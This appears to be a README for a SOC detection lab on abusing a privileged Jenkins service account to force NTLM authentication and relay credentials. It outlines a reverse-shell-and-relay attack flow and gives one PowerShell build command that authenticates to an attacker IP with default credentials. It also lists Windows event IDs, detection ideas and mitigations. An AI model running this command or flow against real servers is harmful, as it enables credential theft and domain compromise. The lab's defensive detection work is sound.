# SOC-Privilege-Escalation- Detection-Lab/
Detection engineering lab simulating Active Directory priviledge escalation techniques to analyze Windows tlemetary and build Splunk-based monitoring use cases


🔹 Overview

This module demonstrates abusing Jenkins running under a privileged service account to trigger outbound NTLM authentication and facilitate credential relay.

If Jenkins runs under a domain account with administrative privileges, build execution can be used to initiate PowerShell commands that trigger NTLM authentication.

⸻

🔹 Attack Preconditions
	•	Access to Jenkins dashboard
	•	Jenkins service running as privileged domain account
	•	Ability to create and execute builds
	•	Firewall configured to allow outbound connections (lab note: always verify open ports)

⸻

🔹 Attack Flow
	1.	Host PowerShell TCP reverse shell script on HFS.
	2.	Start Netcat listener on port 443.
	3.	Create a new Jenkins build job.
	4.	Insert PowerShell command: 




5.	Run the build.
	6.	Confirm reverse connection.
	7.	Trigger NTLM authentication.
	8.	Relay credentials.
	9.	Execute whoami to confirm elevated access.

⸻
    N/B: Build Command; Help
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://192.168.221.132' -UseDefaultCredentials"|



         🔹 Key Windows Event Logs


          _________________________________________________________
           ||Event ID                | Description               |  
           ________________________________________________________    
          | 4624                     |  Successful logon         |
           ________________________________________________________     
          | 4625                     |  Failed logon             |
           ________________________________________________________    
          | 4648                     |  Explicit credential use  |
           _________________________________________________________
          | 4672                     |  Special privileges assigned|
           _________________________________________________________
          | 4688                     |  Process creation         |
          |                          |  (powershell from Jenkins |
          |                          |  context)                 |
           ________________________________________________________
          | 5140                     |  SMB share access         | 
           ________________________________________________________
          | 4769                     |  Kerberos service ticket  |
          _________________________________________________________

   

            🔹 Detection Strategy
	•	Monitor PowerShell spawned by Jenkins service account.
	•	Alert on outbound SMB or HTTP authentication from servers.
	•	Track 4624 logons initiated by service accounts.
	•	Correlate build execution timestamps with network activity.

⸻

🔹 Mitigation
	•	Disable NTLM where possible.
	•	Enforce SMB signing.
	•	Run Jenkins under low-privilege service account.
	•	Restrict outbound authentication from servers.
	•	Monitor abnormal Jenkins build commands.
	•	Implement PowerShell constrained language mode.
            




               

